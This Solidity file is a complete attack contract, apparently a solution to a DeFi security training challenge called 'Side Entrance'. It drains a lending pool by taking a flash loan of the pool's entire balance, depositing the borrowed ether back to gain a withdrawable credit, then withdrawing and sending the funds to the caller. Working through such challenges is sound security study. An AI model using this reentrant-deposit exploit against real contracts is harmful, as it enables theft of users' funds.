// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";


contract SideEntranceLenderAttackContract is IFlashLoanEtherReceiver {
    using Address for address payable;

    function execute() external payable override {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function attack(address payable poolAddress) external {
        SideEntranceLenderPool pool = SideEntranceLenderPool(poolAddress);
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
        payable(msg.sender).sendValue(poolBalance);
    }

    receive() external payable {}
}
